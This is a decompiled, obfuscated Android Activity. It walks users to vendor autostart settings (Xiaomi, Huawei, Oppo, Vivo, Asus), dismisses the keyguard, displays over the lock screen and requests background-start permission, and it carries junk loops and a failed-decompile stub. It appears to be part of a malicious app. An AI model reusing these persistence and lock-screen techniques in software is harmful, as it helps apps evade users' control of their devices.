package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import androidx.core.app.C0004a;
import androidx.core.content.C0025a;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
/* loaded from: classes.dex */
public class Remsztaseriafbhrtweugotsixfmmugackkusywxugvonxphmwez26UI extends Activity {

    /* renamed from: a */
    public static List<Intent> f113a = Arrays.asList(new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")), new Intent().setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")), new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")), new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")), new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")), new Intent().setComponent(new ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")), new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")), new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")), new Intent().setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")), new Intent().setComponent(new ComponentName("com.asus.mobilemanager", "com.asus.mobilemanager.entry.FunctionActivity")).setData(Uri.parse("mobilemanager://function/entry/AutoStart")));

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.Remsztaseriafbhrtweugotsixfmmugackkusywxugvonxphmwez26UI$a */
    /* loaded from: classes.dex */
    public class DialogInterface$OnClickListenerC0030a implements DialogInterface.OnClickListener {

        /* renamed from: a */
        final /* synthetic */ SharedPreferences f114a;

        /* renamed from: b */
        final /* synthetic */ Context f115b;

        DialogInterface$OnClickListenerC0030a(Remsztaseriafbhrtweugotsixfmmugackkusywxugvonxphmwez26UI remsztaseriafbhrtweugotsixfmmugackkusywxugvonxphmwez26UI, SharedPreferences sharedPreferences, Context context) {
            this.f114a = sharedPreferences;
            this.f115b = context;
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialogInterface, int i) {
            boolean z;
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f316l = Boolean.TRUE;
            SharedPreferences.Editor edit = this.f114a.edit();
            Iterator<Intent> it = Remsztaseriafbhrtweugotsixfmmugackkusywxugvonxphmwez26UI.f113a.iterator();
            while (true) {
                if (!it.hasNext()) {
                    z = false;
                    break;
                }
                Intent next = it.next();
                if (Remsztaseriafbhrtweugotsixfmmugackkusywxugvonxphmwez26UI.m268c(this.f115b, next)) {
                    next.setFlags(268435456);
                    this.f115b.startActivity(next);
                    z = true;
                    break;
                }
            }
            if (z) {
                return;
            }
            edit.putBoolean("skipProtectedAppCheck", true);
            edit.apply();
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:29:0x0075, code lost:
        if (r3.equals("en") != false) goto L27;
     */
    /* renamed from: a */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private void m270a() {
        /*
            Method dump skipped, instructions count: 380
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.Remsztaseriafbhrtweugotsixfmmugackkusywxugvonxphmwez26UI.m270a():void");
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: c */
    public static boolean m268c(Context context, Intent intent) {
        return context.getPackageManager().queryIntentActivities(intent, 65536).size() > 0;
    }

    @Override // android.app.Activity
    public void finish() {
        C0045d.f182W = Boolean.FALSE;
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == 595) {
            if (i2 == -1) {
                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f316l = Boolean.FALSE;
                finish();
            } else if (i2 == 0) {
                finish();
                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f316l = Boolean.FALSE;
            }
        }
    }

    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:10:0x0046 -> B:32:0x0074). Please submit an issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:23:0x006f -> B:32:0x0074). Please submit an issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:8:0x003e -> B:32:0x0074). Please submit an issue!!! */
    @Override // android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        int i = 6816768;
        try {
            try {
                try {
                    if (Build.VERSION.SDK_INT >= 27) {
                        getWindow().addFlags(1024);
                        ((KeyguardManager) getApplicationContext().getSystemService("keyguard")).requestDismissKeyguard(this, null);
                        setShowWhenLocked(true);
                    } else {
                        getWindow().setFlags(1024, 6816768);
                    }
                } catch (Exception unused) {
                    Boolean bool = Boolean.TRUE;
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                }
            } catch (Exception unused2) {
                getWindow().setFlags(1024, i);
            }
        } catch (Exception unused3) {
            getWindow().setFlags(1024, 1024);
        }
        try {
            m270a();
            i = 23;
            if (Build.VERSION.SDK_INT < 23 || C0025a.m312a(getApplicationContext(), "android.permission.BACKGROUND_ACTIVITY_STARTER") == 0) {
                return;
            }
            C0004a.m391d(this, new String[]{"android.permission.BACKGROUND_ACTIVITY_STARTER"}, 595);
        } catch (Exception unused4) {
        }
    }
}
